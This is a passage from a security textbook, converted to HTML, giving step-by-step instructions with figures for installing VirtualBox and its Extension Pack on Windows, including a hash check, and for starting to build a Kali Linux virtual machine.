<div class="Section54" ><p class=MsoNormal  style="margin-top:3.7500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark81" ></a><span><a href="#_bookmark80" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-6:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >VirtualBox networking warning</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;" ><a name="_bookmark82" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The next window <a name="_bookmark83" ></a>(</span><span><a href="#_bookmark84" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-7</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >) is the last one prior to the installer actually beginning the installation process. Click Install to kick off the installation process.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="172.5"  height="0" ></td></tr><tr><td></td><td><img width="677"  height="529"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker79046.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:6.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.8000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark84" ></a><span><a href="#_bookmark83" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-7:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >VirtualBox installation window</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You should see a window with a status bar that displays the progress of the installation process (<a name="_bookmark85" ></a></span><span><a href="#_bookmark86" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-8</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section55" ><p class=MsoBodyText  style="margin-left:39.5000pt;" ><img width="677"  height="529"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker79265.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark86" ></a><span><a href="#_bookmark85" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-8:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >VirtualBox installation status</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:9.5500pt;" ><a name="_bookmark87" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >At some point during this process, you will likely be presented with another window regarding installation of device software (<a name="_bookmark88" ></a></span><span><a href="#_bookmark89" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-9</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >). This is the dialog the Windows operating systems prompts an end</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.8500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >user for when system drivers are being installed. VirtualBox uses the system drivers to handle various tasks, such as managing the virtualization features of the host CPU. This window appears numerous times throughout the installation process. Click Install each time to complete the VirtualBox</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.4000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >installation.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section56" ><p class=MsoBodyText  style="margin-left:47.7500pt;" ><img width="648"  height="300"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker79887.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark89" ></a><span><a href="#_bookmark88" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-9:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >VirtualBox driver installation prompt</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >After clicking through the driver installation prompts, you should eventually end up at a window specifying that the installation has been completed and asking if you want to launch the VirtualBox application<a name="_bookmark90" ></a>&nbsp;(</span><span><a href="#_bookmark91" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-10</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >). Click Finish. By default, the VirtualBox graphical interface launches.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="172.5"  height="0" ></td></tr><tr><td></td><td><img width="677"  height="428"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker80297.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.8000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark91" ></a><span><a href="#_bookmark90" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-10:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >VirtualBox installation finished</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;" ><a name="_bookmark92" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You should be presented with the VirtualBox graphical interface. You might also be prompted to restart your machine to finish configuring</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section57" ><p class=MsoBodyText  style="margin-top:3.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >VirtualBox (<a name="_bookmark93" ></a></span><span><a href="#_bookmark94" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-11</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >), depending on your Windows version. Make sure you have saved any important things you are working on and click Yes to start the reboot.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="257.5"  height="0" ></td></tr><tr><td></td><td><img width="507"  height="318"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker80707.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark94" ></a><span><a href="#_bookmark93" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-11:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >VirtualBox GUI and restart window</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You should now be able to select VirtualBox via one of the shortcuts created during installation or through the Start menu.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.0000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Installing the VirtualBox Extension Pack</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.9000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >With VirtualBox installed, you can install the VirtualBox Extension Pack so that you can access some of the more advanced features. You need to make sure that you download the version that supports the version of VirtualBox you have installed. For the figures, we installed VirtualBox verson 5.1.12, so we clicked the appropriate link on the VirtualBox Download page, as shown in<a name="_bookmark95" ></a>&nbsp;</span><span><a href="#_bookmark96" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-12</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section58" ><p class=MsoBodyText ><img width="779"  height="340"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker81377.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark96" ></a><span><a href="#_bookmark95" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-12:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >VirtualBox Extension Pack download</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >As with the installer, you want to follow the same process of checking the SHA-256 hash to ensure that the file was not modified in transit. Copy and paste the PowerShell code used earlier into a PowerShell window, making sure to change the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >$vboxinstaller </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >variable to the name of the VirtualBox Extension Pack that you just downloaded.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >After getting the SHA-256 hash, make sure that it matches the checksum provided on the VirtualBox website. Assuming they match, continue with the installation process.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.4500pt;" ><a name="_bookmark97" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >First, launch the VirtualBox GUI by clicking the VirtualBox shortcuts created during installation or by selecting it from the Start menu. With the VirtualBox GUI open, click File on the menu bar, then select Preferences from the pull-down menu. A new dialog box appears.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-right:16.1000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Highlight Extension from the left pane to show what extension packs have been installed. None is installed yet, but you are about to install one. On the far right of the dialog box is a triangle and square-shaped</span><span><a href="#_bookmark99" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&nbsp;button. Click that button to add a VirtualBox Extension Pack. </span><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >2-13</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >should help make this process clearer.</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section59" ><p class=MsoBodyText  style="margin-left:28.2500pt;" ><img width="714"  height="495"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker82592.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark99" ></a><span><a href="#_bookmark98" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-13:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >VirtualBox Extension Pack preferences</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:9.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You should now have a file dialog box. Select the VirtualBox Extension Pack file that you previously downloaded. With that, you should be presented with <a name="_bookmark100" ></a>another window (see<a name="_bookmark101" ></a>&nbsp;</span><span><a href="#_bookmark102" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-14</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >) regarding the installation of the Extension Pack. Click Install to continue or Upgrade, if a previous version was already installed.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="261.25"  height="0" ></td></tr><tr><td></td><td><img width="499"  height="333"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker83028.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:11.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section60" ><p class=MsoNormal  style="margin-top:3.7500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark102" ></a><span><a href="#_bookmark101" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-14:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >VirtualBox Extension Pack installation</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;margin-right:13.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You will be prompted with the VirtualBox Personal Use and Evaluation License (PUEL). Read it and click I Agree. After a quick status bar pops up, you should be presented with a window similar to what is shown in<a name="_bookmark103" ></a>&nbsp;</span><span><a href="#_bookmark104" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-15</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. This specifies that the VirtualBox Extension Pack is now installed.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="327.5"  height="0" ></td></tr><tr><td></td><td><img width="365"  height="170"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker83440.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:6.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.8000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark104" ></a><span><a href="#_bookmark103" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-15:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Successful VirtualBox Extension Pack installation</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Click OK, and then click Cancel to exit the preferences window. Congratulations! You now have VirtualBox installed and are ready to install your first guest operating system.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.0500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Creating a Kali Linux Virtual Machine</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:12.0500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Let&#8217;s not waste a minute more&#8212;time to create the first VM. Because we are using Kali Linux throughout this book, our VM will run Kali Linux. A big advantage to using Kali is that it is supported on multiple architectures. You can even install a version of Kali on your Android phone.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:10.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The first action to take is to download Kali. You can find the download</span><span><a href="#_bookmark106" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&nbsp;at the </span></a></span><span><a href="https://www.kali.org/downloads/" ><u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:12.0000pt;" >https://www.kali.org/downloads/</span></u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);font-size:12.0000pt;" >&nbsp;</span></a></span><span><a href="#_bookmark106" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >website. As shown in </span><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >2-16</span></u><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, there are several options.</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section61" ><p class=MsoBodyText ><img width="780"  height="577"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker84322.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark106" ></a><span><a href="#_bookmark105" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-16:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Kali download web page</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:10.1500pt;" ><a name="_bookmark107" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You may notice there is an option to download prebuilt VMware and VirtualBox images. These images are only available via Torrent download (in this case, a legal Torrent). We avoid this option for two reasons: First, we don&#8217;t want to require you to download more software than necessary&#8212;in this case, a Torrent client. Second, it is best to have the Kali ISO image handy. This file can be burned directly to a CD and can be used to boot a machine directly into Kali. So, let&#8217;s download the Kali Linux ISO image.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="763"  height="199"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker84904.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:5.0000pt;" ><o:p>&nbsp;</o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
